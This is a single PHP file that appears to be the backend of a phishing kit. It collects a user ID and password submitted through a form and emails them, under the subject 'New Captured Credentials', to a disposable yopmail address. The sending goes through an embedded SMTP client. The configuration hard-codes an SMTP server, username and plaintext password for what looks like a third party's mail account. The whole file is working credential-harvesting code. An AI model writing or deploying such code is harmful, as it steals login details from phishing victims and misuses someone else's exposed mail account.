<?php
/**
 * Single PHP file to collect userID and password, and send via SMTP.
 */

/** Embedded simple SMTP mailer classes **/

class PHPMailer {
    public $Host, $SMTPAuth, $Username, $Password, $SMTPSecure, $Port;
    public $From, $FromName, $Subject, $Body, $AltBody, $isHTML = false;
    private $to = [];
    private $headers = '';
    public $ErrorInfo = '';

    public function isSMTP() {}
    public function setFrom($address, $name = '') {
        $this->From = $address;
        $this->FromName = $name;
    }
    public function addAddress($address, $name = '') {
        $this->to[] = [$address, $name];
    }
    public function isHTML($isHtml = true) {
        $this->isHTML = $isHtml;
    }
    public function send() {
        $toAddresses = array_map(function($recipient) {
            return $recipient[1] ? "{$recipient[1]} <{$recipient[0]}>" : $recipient[0];
        }, $this->to);

        $this->headers = "From: {$this->FromName} <{$this->From}>\r\n";
        if ($this->isHTML) {
            $this->headers .= "MIME-Version: 1.0\r\n";
            $this->headers .= "Content-type: text/html; charset=UTF-8\r\n";
        }

        $smtp = new SMTP();
        if (!$smtp->connect($this->Host, $this->Port, $this->SMTPSecure)) {
            $this->ErrorInfo = $smtp->getError();
            return false;
        }
        if (!$smtp->auth($this->Username, $this->Password)) {
            $this->ErrorInfo = $smtp->getError();
            return false;
        }
        if (!$smtp->send($this->From, $toAddresses, $this->Subject, $this->Body, $this->headers)) {
            $this->ErrorInfo = $smtp->getError();
            return false;
        }
        $smtp->quit();
        return true;
    }
}

class SMTP {
    private $connection;
    private $lastResponse = '';

    public function connect($host, $port = 587, $secure = 'tls') {
        $transport = ($secure == 'ssl') ? 'ssl://' : '';
        $this->connection = fsockopen($transport . $host, $port, $errno, $errstr, 10);
        if (!$this->connection) {
            $this->lastResponse = "Connection failed: $errstr ($errno)";
            return false;
        }
        $this->getLines();
        $this->sendCommand("EHLO " . $_SERVER['SERVER_NAME']);
        if ($secure == 'tls') {
            $this->sendCommand("STARTTLS");
            stream_socket_enable_crypto($this->connection, true, STREAM_CRYPTO_METHOD_TLS_CLIENT);
            $this->sendCommand("EHLO " . $_SERVER['SERVER_NAME']);
        }
        return true;
    }

    public function auth($username, $password) {
        $this->sendCommand("AUTH LOGIN");
        $this->sendCommand(base64_encode($username));
        $this->sendCommand(base64_encode($password));
        return true;
    }

    public function send($from, $to, $subject, $body, $headers) {
        $this->sendCommand("MAIL FROM: <{$from}>");
        foreach ($to as $recipient) {
            $this->sendCommand("RCPT TO: <{$recipient}>");
        }
        $this->sendCommand("DATA");
        $data = $headers . "\r\nSubject: {$subject}\r\n\r\n{$body}\r\n.";
        $this->sendCommand($data);
        return true;
    }

    public function quit() {
        $this->sendCommand("QUIT");
        fclose($this->connection);
    }

    private function sendCommand($cmd) {
        fwrite($this->connection, $cmd . "\r\n");
        return $this->getLines();
    }

    private function getLines() {
        $data = '';
        while ($str = fgets($this->connection, 515)) {
            $data .= $str;
            if (substr($str, 3, 1) == ' ') { break; }
        }
        $this->lastResponse = $data;
        return $data;
    }

    public function getError() {
        return $this->lastResponse;
    }
}

/** End of embedded classes **/

// ========== YOUR CONFIGURATION ==========
$smtpHost = 'smtp.liwest.at';     // SMTP server
$smtpUsername = 'fliesenambiente@liwest.at'; // SMTP username
$smtpPassword = 'qeitjkak';    // SMTP password
$smtpPort = 587;                    // Port (587 = TLS, 465 = SSL)
$smtpSecure = 'tls';                // tls or ssl

$to = "fw34t2t45t43@yopmail.com";    // Where to send the form details
// =========================================

// Process form
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $email = isset($_POST['userID']) ? strip_tags($_POST['userID']) : '';
    $password = isset($_POST['password']) ? strip_tags($_POST['password']) : '';

    if (empty($email) || empty($password)) {
        echo 'Please fill all fields.';
        exit;
    }

    $mail = new PHPMailer();
    $mail->isSMTP();
    $mail->Host = $smtpHost;
    $mail->SMTPAuth = true;
    $mail->Username = $smtpUsername;
    $mail->Password = $smtpPassword;
    $mail->SMTPSecure = $smtpSecure;
    $mail->Port = $smtpPort;

    $mail->setFrom($smtpUsername, 'Form Capture');
    $mail->addAddress($to, 'Recipient');

    $mail->isHTML(true);
    $mail->Subject = "New Captured Credentials";
    $mail->Body = "
        <h2>Captured Details</h2>
        <p><strong>User ID:</strong> {$email}</p>
        <p><strong>Password:</strong> {$password}</p>
    ";
    $mail->AltBody = "User ID: {$email}\nPassword: {$password}";

    if ($mail->send()) {
        echo 'Message sent successfully!';
    } else {
        echo 'Mailer Error: ' . $mail->ErrorInfo;
    }
} else {
    echo 'Invalid request.';
}
?>
